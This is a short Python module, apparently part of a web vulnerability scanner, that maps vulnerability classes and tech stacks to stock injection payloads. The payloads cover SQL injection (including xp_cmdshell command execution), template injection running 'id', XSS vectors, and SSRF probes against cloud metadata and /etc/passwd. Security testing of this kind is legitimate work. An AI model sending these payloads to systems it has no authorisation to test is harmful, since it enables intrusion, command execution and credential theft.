from __future__ import annotations

from typing import Any


PAYLOAD_FAMILIES: dict[str, dict[str, list[str]]] = {
    "sqli": {
        "postgresql": ["' OR 1=1--", "' UNION SELECT NULL,version()--", "$$SELECT current_user$$"],
        "mysql": ["' OR 1=1#", "' UNION SELECT NULL,@@version#", "' AND SLEEP(5)#"],
        "mssql": ["' OR 1=1--", "'; WAITFOR DELAY '0:0:5'--", "'; EXEC xp_cmdshell('whoami')--"],
        "mongodb": ['{"$ne": null}', '{"$gt": ""}', '{"$where": "1==1"}'],
        "generic": ["' OR '1'='1", "1 AND 1=1", "' AND '1'='1"],
    },
    "ssti": {
        "jinja2": ["{{7*7}}", "{{config}}", "{{''.__class__.__mro__}}"],
        "twig": ["{{7*7}}", "{{_self.env.registerUndefinedFilterCallback}}"],
        "freemarker": ["${7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}"],
        "generic": ["{{7*7}}", "${7*7}", "<%=7*7%>"],
    },
    "xss": {
        "react": ["<img src=x onerror=alert(1)>", "javascript:alert(1)"],
        "angular": ["{{constructor.constructor('alert(1)')()}}"],
        "vue": ["<img src=x onerror=alert(1)>", "{{this.constructor.constructor('alert(1)')()}}"],
        "generic": ["<script>alert(1)</script>", "<svg onload=alert(1)>"],
    },
    "ssrf": {
        "generic": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80/", "file:///etc/passwd"],
    },
}


def _candidate_tech_keys(tech_stack: Any) -> list[str]:
    if not isinstance(tech_stack, dict):
        return []
    values = [
        tech_stack.get("database"),
        tech_stack.get("framework"),
        tech_stack.get("frontend"),
        tech_stack.get("backend_language"),
        tech_stack.get("server"),
    ]
    out: list[str] = []
    seen: set[str] = set()
    for value in values:
        text = str(value or "").strip().lower()
        if not text or text in seen:
            continue
        seen.add(text)
        out.append(text)
    return out


def get_payloads(
    vuln_class: str,
    tech_stack: dict[str, Any] | None,
    max_payloads: int = 5,
) -> list[str]:
    family = PAYLOAD_FAMILIES.get(str(vuln_class or "").strip().lower(), {})
    if not family:
        return []

    for key in _candidate_tech_keys(tech_stack):
        if key in family:
            return family[key][: max(1, int(max_payloads))]

    return family.get("generic", [])[: max(1, int(max_payloads))]
